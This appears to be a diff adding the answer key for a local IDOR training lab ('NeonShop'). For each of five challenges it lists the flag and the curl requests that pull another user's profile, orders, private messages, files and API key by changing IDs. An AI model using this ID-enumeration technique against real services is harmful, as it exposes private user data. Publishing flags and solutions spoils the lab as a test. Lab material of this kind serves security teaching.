@@ -1,0 +1,88 @@
+===============================================================================
+  NeonShop — IDOR Lab Solutions (Port 5004)
+===============================================================================
+
+  You are auto-logged in as user_id=2 (normal user). The goal is to
+  access admin (user_id=1) resources by manipulating object references.
+
+  Enumeration helpers:
+    curl http://localhost:5004/api/users    (list all users with IDs)
+    curl http://localhost:5004/api/files    (list all files with ownership)
+    curl http://localhost:5004/hints        (challenge descriptions)
+
+-------------------------------------------------------------------------------
+
+CHALLENGE 1: User Profile IDOR
+Flag: FLAG{1d0r_pr0f1l3_4cc3ss}
+
+  The /api/user/<id> endpoint returns any user's profile with no
+  authorization check (no session/ownership validation).
+
+  curl http://localhost:5004/api/user/1
+
+  The admin's secret_note field contains the flag.
+
+-------------------------------------------------------------------------------
+
+CHALLENGE 2: Order IDOR
+Flag: FLAG{1d0r_0rd3r_l34k}
+
+  The /api/order/<id> endpoint returns any order with no ownership check.
+
+  curl http://localhost:5004/api/order/1
+
+  Admin's order (id=1) has the flag in the notes field.
+
+  Enumerate orders:
+    curl http://localhost:5004/api/order/1
+    curl http://localhost:5004/api/order/2
+    curl http://localhost:5004/api/order/3
+
+-------------------------------------------------------------------------------
+
+CHALLENGE 3: Private Message IDOR
+Flag: FLAG{1d0r_m3ss4g3_r34d}
+
+  The /api/message/<id> endpoint returns any message, including
+  private ones (is_private=1), with no authorization.
+
+  curl http://localhost:5004/api/message/1
+
+  The private message from admin contains the flag in the content field.
+
+  Enumerate messages:
+    curl http://localhost:5004/api/message/1
+    curl http://localhost:5004/api/message/2
+    curl http://localhost:5004/api/message/3
+
+-------------------------------------------------------------------------------
+
+CHALLENGE 4: File Download IDOR
+Flag: FLAG{1d0r_f1l3_d0wnl04d}
+
+  The /download endpoint takes a filename parameter with no ownership check.
+
+  First, discover files:
+    curl http://localhost:5004/api/files
+
+  Then download admin's private file:
+    curl "http://localhost:5004/download?file=admin_report.txt"
+
+  The file content contains the flag.
+
+-------------------------------------------------------------------------------
+
+CHALLENGE 5: API Key IDOR
+Flag: FLAG{1d0r_4p1_k3y_l34k}
+
+  The /api/settings endpoint takes a user_id parameter and returns
+  that user's settings including their API key.
+
+  curl "http://localhost:5004/api/settings?user_id=1"
+
+  The admin's api_key field contains the flag.
+
+  Compare with your own settings (should only see your own):
+    curl "http://localhost:5004/api/settings?user_id=2"
+
+===============================================================================
